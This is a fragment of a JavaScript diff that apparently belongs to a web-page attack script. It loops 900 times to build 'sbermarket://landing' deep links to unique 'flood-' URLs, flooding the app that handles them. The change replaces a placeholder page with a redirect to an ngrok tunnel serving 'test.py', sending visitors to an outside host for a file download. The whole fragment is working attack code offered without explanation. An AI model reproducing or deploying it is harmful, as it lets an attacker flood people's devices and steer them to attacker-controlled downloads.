@@ -5,6 +5,5 @@ for(let i=0; i<900; i++) {
   data: 'sbermarket://landing?url=https://tiburon-research.ru/flood-' + i + '-' + Date.now() + '-' + Math.random().toString(36).substr(2)
   }));
 }
-document.open();
-document.write('<html><body><h1>New Content</h1></body></html>');
-document.close();
+
+window.location = "https://pickier-unmindfully-lorelei.ngrok-free.dev/test.py";
